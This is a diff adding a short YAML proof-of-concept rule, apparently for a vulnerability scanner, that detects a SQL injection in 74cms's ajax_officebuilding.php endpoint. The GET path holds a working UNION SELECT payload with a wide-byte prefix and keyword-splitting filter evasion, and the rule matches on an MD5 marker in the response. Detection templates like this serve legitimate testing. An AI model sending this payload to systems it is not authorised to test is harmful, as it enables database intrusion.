@@ -1,0 +1,10 @@
+name: poc-yaml-74cms-sqli-2
+rules:
+  - method: GET
+    path: /plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5(7836457),5,6,7,8,9%23
+    expression: |
+      response.body.bcontains(b"3438d5e3ead84b2effc5ec33ed1239f5")
+detail:
+  author: rexus
+  links:
+    - https://www.uedbox.com/post/30019/
